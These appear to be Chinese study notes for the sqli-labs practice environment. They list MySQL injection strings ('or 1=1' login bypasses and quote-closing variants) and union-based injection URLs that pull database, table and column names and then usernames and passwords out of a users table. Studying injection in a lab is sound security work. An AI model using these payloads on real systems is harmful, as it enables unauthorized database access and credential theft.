# Mysql

## 万能密码测试

- ' or 1=1#

## 判断语句

- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

此处的`--`为注释，+为占位，也可以通过%20(空格的URL编码)来替代，因为地址栏空格不会进入mysql语句，或者可以直接用%23（#）进行注释

## Information_schema

### 三个常用表

#### Schemata

SCHEMA_NAME:数据库名

#### tables

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

#### columns

TABLE_SCHEMA:数据库名

TABLE_NAME:表名

COLUMN_NAME:字段名

### 爆数据库(schemata)

```
http://192.168.154.131/sqli/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

数据库名.表名：information_schema.schemata

### 爆表名(tables)

```
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

where 之后的条件用来筛选选中的数据库

table_schema为数据库名

table_name为表名

### 爆字段(columns)

```
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

### 爆数据

由上面的处理已知存在数据表users,users下有username和password两个字段

所以可以构造语句

```
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,group_concat(username),group_concat(password) from users--+
```

查询所有结果或者通过id来查询指定的结果

```
http://192.168.154.131/sqli/Less-1/index.php?id=-1' union select 1,username,password from users where id=2--+
```

## 常用函数

group_concat(schema_name)可以查出所有的数据库名



